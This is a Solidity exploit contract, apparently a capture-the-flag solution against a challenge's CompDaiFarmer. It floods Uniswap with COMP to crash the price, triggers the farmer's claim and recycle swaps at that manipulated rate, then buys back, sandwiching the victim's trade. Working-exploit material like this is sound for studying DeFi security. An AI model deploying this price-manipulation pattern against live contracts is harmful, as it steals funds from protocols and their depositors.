pragma solidity ^0.8.0;

import "public/Setup.sol";

contract Exploit {
    ERC20Like public constant dai = ERC20Like(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    UniRouter public constant router = UniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    WETH9 public constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    ERC20Like public constant COMP = ERC20Like(0xc00e94Cb662C3520282E6f5717214004A7f26888);
    address public constant sushi = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    CompDaiFarmer public farmer;
    Setup setup;

    constructor(Setup _setup) payable {
        WETH.deposit{value: msg.value}();
        setup = _setup;
        farmer = setup.farmer();
        WETH.approve(address(farmer), type(uint256).max);
        WETH.approve(address(router), type(uint256).max);
        WETH.approve(sushi, type(uint256).max);

        COMP.approve(address(farmer), type(uint256).max);
        COMP.approve(address(router), type(uint256).max);
        COMP.approve(sushi, type(uint256).max);

        // buy some COMP with our WETH
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(COMP);
        
        // get a bunch of COMP via sushiswap
        // to not move the price on uniswap
        UniRouter(sushi).swapExactTokensForTokens(
            40 ether,
            0,
            path,
            address(this),
            block.timestamp + 1800
        );

        path = new address[](3);
        path[0] = address(COMP);
        path[1] = address(WETH);
        path[2] = address(dai);

        // send in a lot of COMP so that it becomes very cheap
        router.swapExactTokensForTokens(
            COMP.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1800
        );

        farmer.claim();
        farmer.recycle();

        // buy it back down
        path[0] = address(dai);
        path[1] = address(WETH);
        path[2] = address(COMP);
        dai.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(
            dai.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 1800
        );
    }
}
